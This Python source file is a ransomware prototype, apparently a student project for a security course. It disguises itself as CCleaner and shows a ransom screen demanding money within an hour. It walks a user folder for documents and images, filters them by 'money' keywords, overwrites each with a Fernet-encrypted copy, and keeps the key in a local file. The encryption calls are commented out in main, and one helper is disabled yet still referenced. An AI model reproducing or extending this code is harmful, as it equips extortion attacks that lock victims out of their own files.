import os
import string
from tkinter import *
from PIL import ImageTk, Image
import time
from cryptography.fernet import Fernet

# GUI stuff -----------------------------------------------------------------------------------------------------------------------------------------------
root = Tk()
root.title("CCleaner, totally not Ransomware ( ͡° ͜ʖ ͡°)")
root.iconbitmap('ccleaner.ico')
root.geometry("1035x660")
root.configure(bg = 'red')

skull_image = ImageTk.PhotoImage(Image.open("crossbones.png"))
image_label1 = Label(image = skull_image, bg = 'red')
image_label2 = Label(image = skull_image, bg = 'red')
image_label3 = Label(image = skull_image, bg = 'red')
image_label4 = Label(image = skull_image, bg = 'red')

image_label1.grid(row = 0, column = 0)
image_label2.grid(row = 0, column = 4)
image_label3.grid(row = 4, column = 0)
image_label4.grid(row = 4, column = 4)


main_text = Label(root, text="You just got hacked.\nYour money files are encrypted.\nSend monies or your files will be deleted in one hour.", font = ('Arial', 18), fg = 'white', bg = 'red')
main_text.grid(row = 1, column = 1)

e = Entry(root, width = 50, borderwidth = 5)
e.grid(row = 2, column = 1, padx = 10, pady = 10)
e.insert(0, "Enter Key Here")

b = Button(root, text = "Decrypt", width = 13, height = 2, borderwidth = 5, font = ('Arial', 18))
b.grid(row = 3, column = 1)

# ---------------------------------------------------------------------------------------------------------------------------------------------------------

# safeguard = input("Please enter the safeguard password:")
# if safeguard != 'start':
#     quit()

#creates list of files of certain extensions within given folder
def generate_file_list_keyword(path):
    encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg')
    file_paths = []
    rfile = open('MoneyWords.txt', 'r')
    words = [line[:-1] for line in rfile]
    for root, dirs, files, in os.walk(path):
        for file in files:
            for w in words:
                file_name,file_ext = os.path.splitext(root+'\\'+file)
                if w in ''.join([c for c in file_name.lower() if c.islower()]) and file_ext in encrypted_ext:
                        file_paths.append(root+'\\'+file)
    print(file_paths)
    return file_paths

def generate_file_list(path):
    encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg')
    file_paths = []
    for root, dirs, files, in os.walk(path):
        for file in files:
            file_name,file_ext = os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_ext:
                file_paths.append(root+'\\'+file)
    print(file_paths)
    return file_paths

#creates fernet key and writes it to text file
def write_key():
    key = Fernet.generate_key()

    with open('filekey.txt', 'wb') as filekey:
        filekey.write(key)

#reads and returns key stored in filekey.txt
def read_key():
    try:
        with open('filekey.txt', 'rb') as filekey:
            key = filekey.read()

        fernet = Fernet(key)
        return fernet
    except:
        print("The key does not exist")


#uses fernet key to encrypt all files in file_paths list
def encrypt_files(file_paths, fernet):
    for f in file_paths:
        #create encrypted version of the file
        with open(f, 'rb') as file:
            encrypted = fernet.encrypt(file.read())
        
        #overwrite the original with the new encrypted version
        with open(f, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

#uses fernet key to decrypt all files in file_paths list
def decrypt_files(file_paths, fernet):
    for f in file_paths:
        #create decrypted version of the file
        with open(f, 'rb') as enc_file:
            decrypted = fernet.decrypt(enc_file.read())
        
        #overwrite the original with the new decrypted version
        with open(f, 'wb') as dec_file:
            dec_file.write(decrypted)

#returns whether a keyword was found in a file (only tested with .txt)
# def keyword_check(keyword, f):
#     file = open(f, 'r').read()
#     for word in file.split():       
#         word = word.translate(str.maketrans('', '', string.punctuation))
#         if word.lower() == keyword:
#             return True
#     return False

#returns whether a file is encrypted or not
def isEncrypted(f):
    #probably not the best of way of doing this, only tested with txt files
    #would also let an unencrypted file that starts with gAAA for whatever reason accidentally return true
    file = open(f, 'r').read()
    return file[0:4] == "gAAA"


#sequence to generate a new key and encrypt files with it
def encrypt(file_paths):
    write_key()
    fernet = read_key()

    for f in file_paths:
        print(f)

    encrypt_files(file_paths, fernet)

#sequence to generate a new key and encrypt files that contain a specific keyword
def encrypt_keyword(file_paths, keyword):
    write_key()
    fernet = read_key()

    target_file_paths = []

    for f in file_paths:
        if (keyword_check(keyword, f)):
            target_file_paths.append(f)
            print(f)

    encrypt_files(target_file_paths, fernet)

#sequence to decrypt the already encrypted files using the key that already exists
def decrypt(file_paths):
    fernet = read_key()
    if (fernet != None):
        target_file_paths = []

        for f in file_paths:
            if (isEncrypted(f)):
                target_file_paths.append(f)
                print(f)

        if (len(target_file_paths) == 0):
            print("No files were encrypted")
        else:
            decrypt_files(target_file_paths, fernet)

def main():
    #will need to get current working directory or something later
    # file_paths = generate_file_list('C:\\Users\\ericw\\Documents\\CECS378Test')
    file_paths = generate_file_list_keyword('C:\\Users\\bwiit\\Documents\\CECS378Test')
    # write_key()
    # encrypt_keyword(file_paths, "a")
    # decrypt(file_paths)

if __name__ == "__main__":
    main()

# Also GUI
root.mainloop()